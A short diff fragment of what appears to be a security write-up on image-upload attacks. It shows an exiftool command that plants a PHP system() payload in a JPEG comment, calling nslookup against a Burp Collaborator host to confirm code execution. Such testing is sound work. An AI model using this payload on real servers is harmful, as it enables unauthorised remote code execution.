@@ -104,6 +104,10 @@ We will be using exif tool with the following command:
 
    "exiftool -Comment='<?php system("nslookup 4lqd7k2ulofzkiwzv0m5gf7qohu8ix.burpcollaborator.net"); ?>' beingsecure.jpeg"
 
+POC 
+
+Next we will uploading the created image; 
+
 
 
 
